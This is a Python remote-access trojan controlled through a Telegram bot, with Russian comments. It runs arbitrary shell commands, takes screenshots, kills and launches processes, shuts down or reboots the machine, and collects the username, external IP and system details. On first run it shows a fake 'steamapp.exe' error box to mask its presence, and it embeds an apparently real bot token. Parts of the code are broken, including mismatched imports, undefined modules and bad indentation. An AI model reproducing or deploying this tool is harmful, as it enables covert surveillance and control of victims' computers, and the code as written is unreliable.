import telebot
import requests
import platform
import ctypes
import PIL.ImageGrab
import cv2
import OS
from PIL import Image, ImageGrab, ImageDraw
from pySmartDL import SmartDL
from telebot import types
from telebot import apihelper

my_id = 6091346175 #ID пользователя телеги
bot_token = '7139763243:AAHmkGOsPrdWmfw8DXet-1Fap-jWPNr_8o0' #токен бота , получается при создании в боте @BotFather
bot = telebot.TeleBot(bot_token)

class User:
	def __init__(self):
		keys = ['urldown', 'fin', 'curs']

		for key in keys:
			self.key = None

User.curs = 50


##Клавиатура меню
menu_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnscreen = types.KeyboardButton('📷Быстрый скриншот') #скрин +- в 720P
btnscreendoc = types.KeyboardButton('🖼Полный скриншот') #скриншот в отличном качестве
btnwebcam = types.KeyboardButton('📹Фото вебкамеры')
btnmouse = types.KeyboardButton('🖱Управление мышкой')
btnfiles = types.KeyboardButton('📂Файлы и процессы')
btnaddit = types.KeyboardButton('❇️Дополнительно')
btnmsgbox = types.KeyboardButton('📩Отправка уведомления')
btninfo = types.KeyboardButton('❗️Информация')
menu_keyboard.row(btnscreen, btnscreendoc)
menu_keyboard.row(btnwebcam)
menu_keyboard.row(btnfiles, btnaddit)
menu_keyboard.row(btninfo, btnmsgbox)


#Клавиатура Файлы и Процессы
files_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btnstart = types.KeyboardButton('✔️Запустить')
btnkill = types.KeyboardButton('❌Замочить процесс')
btnback = types.KeyboardButton('⏪Назад⏪')
files_keyboard.row(btnstart,  btnkill)
files_keyboard.row(btnback)


#Клавиатура Дополнительно
additionals_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
btncmd = types.KeyboardButton('✅Выполнить команду')
btnoff = types.KeyboardButton('⛔️Выключить компьютер')
btnreb = types.KeyboardButton('♻️Перезагрузить компьютер')
btnback = types.KeyboardButton('⏪Назад⏪')
additionals_keyboard.row(btnoff, btnreb)
additionals_keyboard.row(btncmd)
additionals_keyboard.row(btnback)

#навигация
info_msg = '''    
*Доступные команды*
_📷Быстрый скриншот_ - отправляет скриншот экрана
_🖼Полный скриншот_ - отправляет скриншот экрана без сжатия
_❇️Дополнительно_ - переходит в меню с доп. функциями
_📩Отправка уведомления_ - пришлет на ПК окно с сообщением(msgbox)
_⏪Назад⏪_ - возвращает в главное меню
_✅Выполнить команду_ - выполняет в cmd любую указанную команду
_⛔️Выключить компьютер_ - моментально выключает компьютер
_♻️Перезагрузить компьютер_ - моментально перезагружает компьютер

_❌Закрыть процесс_ - завершает любой процесс
_✔️Запустить_ - запуск приложений(в том числе и exe)
'''

MessageBox = ctypes.windll.user32.MessageBoxW
if os.path.exists("msg.pt"):
	pass
else:
	bot.send_message(my_id, "Бот, предназначенный для управления ПК дистанционно")
	MessageBox(None, f'steamapp.exe\nОшибка', 0)
	f = open('msg.pt', 'tw', encoding='utf-8')
	f.close

bot.send_message(my_id, "PC online", reply_markup = menu_keyboard)


@bot.message_handler(content_types=["text"])
def get_text_messages(message):
	if message.from_user.id == my_id:
		if message.text == "📷Быстрый скриншот":
			bot.send_chat_action(my_id, 'upload_photo')
			try:
				get_screenshot()
				bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
				os.remove("screen.png")
				os.remove("screen_with_mouse.png")
			except:
				bot.send_message(my_id, "Компьютер заблокирован")
		
		elif message.text == "🖼Полный скриншот":
			bot.send_chat_action(my_id, 'upload_document')
			try:
				get_screenshot()
				bot.send_document(my_id, open("screen_with_mouse.png", "rb"))
				os.remove("screen.png")
				os.remove("screen_with_mouse.png")
			except:
				bot.send_message(my_id, "Компьютер заблокирован")

		elif message.text == "⏪Назад⏪":
			back(message)

		elif message.text == "📂Файлы и процессы":
			bot.send_message(my_id, "📂Файлы и процессы", reply_markup = files_keyboard)
			bot.register_next_step_handler(message, files_process)
		
		elif message.text == "❇️Дополнительно":
			bot.send_message(my_id, "❇️Дополнительно", reply_markup = additionals_keyboard)
			bot.register_next_step_handler(message, addons_process)

		elif message.text == "📩Отправка уведомления":
			bot.send_message(my_id, "Укажите текст уведомления:")
			bot.register_next_step_handler(message, messaga_process)

		else:
			pass
	else:
		info_user(message)


def addons_process(message):
	if message.from_user.id == my_id:
		bot.send_chat_action(my_id, 'typing')
		if message.text == "🔗Перейти по ссылке":
			bot.send_message(my_id, "Укажите ссылку: ")
			bot.register_next_step_handler(message, web_process)

		elif message.text == "✅Выполнить команду":
			bot.send_message(my_id, "Укажите консольную команду: ")
			bot.register_next_step_handler(message, cmd_process)

		elif message.text == "⛔️Выключить компьютер":
			bot.send_message(my_id, "Выключение компьютера...")
			os.system('shutdown -s /t 0 /f')
			bot.register_next_step_handler(message, addons_process)
		
		elif message.text == "♻️Перезагрузить компьютер":
			bot.send_message(my_id, "Перезагрузка компьютера...")
			os.system('shutdown -r /t 0 /f')
			bot.register_next_step_handler(message, addons_process)
                elif message.text == "🖥О ПК":
			req = requests.get('http://ip.42.pl/raw')
			ip = req.text
			uname = os.getlogin()
			windows = platform.platform()
			processor = platform.processor()
			bot.send_message(my_id, f"*Текущий юзер, вошедший в систему:* {uname}\n*IP:* {ip}\n*ОС:* {windows}\n*Процессор:* {processor}", parse_mode = "markdown")
			bot.register_next_step_handler(message, addons_process)

		elif message.text == "⏪Назад⏪":
			back(message)
		else:
			pass
	else:
		info_user(message)


def files_process(message):
	if message.from_user.id == my_id:
		bot.send_chat_action(my_id, 'typing')
		if message.text == "❌Закрыть процесс":	
			bot.send_message(my_id, "Укажите название процесса: ")
			bot.register_next_step_handler(message, kill_process)

		elif message.text == "✔️Запустить":
			bot.send_message(my_id, "Укажите путь до файла: ")
			bot.register_next_step_handler(message, start_process)

		elif message.text == "⏪Назад⏪":
			back(message)
		else:
			pass
	else:
		info_user(message)

def back(message):
	bot.register_next_step_handler(message, get_text_messages)
	bot.send_message(my_id, "Вы в главном меню", reply_markup = menu_keyboard)

def info_user(message):
	bot.send_chat_action(my_id, 'typing')
	alert = f"Кто-то пытался отправить команду: \"{message.text}\"\n\n"
	alert += f"user id: {str(message.from_user.id)}\n"
	alert += f"first name: {str(message.from_user.first_name)}\n"
	alert += f"last name: {str(message.from_user.last_name)}\n" 
	alert += f"username: @{str(message.from_user.username)}"
	bot.send_message(my_id, alert, reply_markup = menu_keyboard)

def kill_process (message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.system("taskkill /IM " + message.text + " -F")
		bot.send_message(my_id, f"Процесс \"{message.text}\" снят", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "Процесс не найден", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)

def start_process (message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.startfile(r'' + message.text)
		bot.send_message(my_id, f"Файл по пути \"{message.text}\" запущен", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)
	except:
		bot.send_message(my_id, "Ошибка! Указан неверный файл", reply_markup = files_keyboard)
		bot.register_next_step_handler(message, files_process)

def web_process (message):
	bot.send_chat_action(my_id, 'typing')
	try:
		webbrowser.open(message.text, new=0)
		bot.send_message(my_id, f"Переход по ссылке \"{message.text}\" осуществлён", reply_markup = additionals_keyboard)
		bot.register_next_step_handler(message, addons_process)
	except:
		bot.send_message(my_id, "Ошибка! ссылка введена неверно")
		bot.register_next_step_handler(message, addons_process)

def cmd_process (message):
	bot.send_chat_action(my_id, 'typing')
	try:
		os.system(message.text)
		bot.send_message(my_id, f"Команда \"{message.text}\" выполнена", reply_markup = additionals_keyboard)
		bot.register_next_step_handler(message, addons_process)
	except:
		bot.send_message(my_id, "Ошибка! Неизвестная команда")
		bot.register_next_step_handler(message, addons_process)

def say_process(message):
	bot.send_chat_action(my_id, 'typing')
	bot.send_message(my_id, "В разработке...", reply_markup = menu_keyboard)

def messaga_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		MessageBox(None, message.text, 'PC TOOL', 0)
		bot.send_message(my_id, f"Уведомление с текстом \"{message.text}\" было закрыто")
	except:
		bot.send_message(my_id, "Ошибка")

def screen_process(message):
	try:
		get_screenshot()
		bot.send_photo(my_id, open("screen_with_mouse.png", "rb"))
		bot.register_next_step_handler(message, mouse_process)
		os.remove("screen.png")
		os.remove("screen_with_mouse.png")
	except:
			bot.send_chat_action(my_id, 'typing')
			bot.send_message(my_id, "Компьютер заблокирован")
			bot.register_next_step_handler(message, mouse_process)
	
def get_screenshot():
	currentMouseX, currentMouseY  =  mouse.get_position()
	img = PIL.ImageGrab.grab()
	img.save("screen.png", "png")
	img = Image.open("screen.png")
	draw = ImageDraw.Draw(img)
	draw.polygon((currentMouseX, currentMouseY, currentMouseX, currentMouseY + 20, currentMouseX + 13, currentMouseY + 13), fill="white", outline="black")
	img.save("screen_with_mouse.png", "PNG")

def is_digit(string):
	if string.isdigit():
		return True
	else:
		try:
			float(string)
			return True
		except ValueError:
			return False


#while True:
#	try:
bot.polling(none_stop=True, interval=0, timeout=20)
#	except Exception as E:
#		print(E.args)
#		time.sleep(2)
